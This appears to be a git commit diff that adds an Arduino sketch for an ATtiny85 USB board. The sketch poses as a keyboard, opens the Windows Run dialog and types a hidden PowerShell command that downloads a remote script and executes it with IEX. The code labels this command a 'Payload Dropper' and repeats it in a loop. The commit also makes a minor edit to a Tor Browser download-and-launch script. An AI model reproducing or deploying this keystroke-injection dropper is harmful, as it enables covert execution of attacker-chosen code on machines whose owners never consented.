04bd845d703734ce497970a9b50d92a1e1bd0b7a
mattkozlowski <mateusz.a.kozlowski@gmail.com>
2023-01-22 02:20:40 +0100

    Fixes

---
+++ attiny-85-installed-programs/installed_programs.ino
@@ -0,0 +1,19 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+  pinMode(1, OUTPUT); //LED on Model A 
+}
+
+void loop() {
+  DigiKeyboard.update();
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("powershell -windowstyle hidden -command IEX (iwr \"https://raw.githubusercontent.com/mattkozlowski/Micronucleus/main/attiny-85-installed-programs/installed.ps1\")"); //Payload Dropper
+  DigiKeyboard.delay(500);
+  digitalWrite(1, HIGH);
+  DigiKeyboard.delay(90000);
+  digitalWrite(1, LOW); 
+  DigiKeyboard.delay(5000);
+}
--- tor-browser/download-tor-browser.ps1
+++ tor-browser/download-tor-browser.ps1
@@ -1,4 +1,4 @@
 $URL = "https://www.torproject.org/dist/torbrowser/12.0.2/torbrowser-install-win64-12.0.2_ALL.exe"
 $Path = [Environment]::GetFolderPath("Desktop") + "\torbrowser.exe"
 Invoke-WebRequest -URI $URL -OutFile $Path
-Start-Process $Path
+Start-Process $Path 
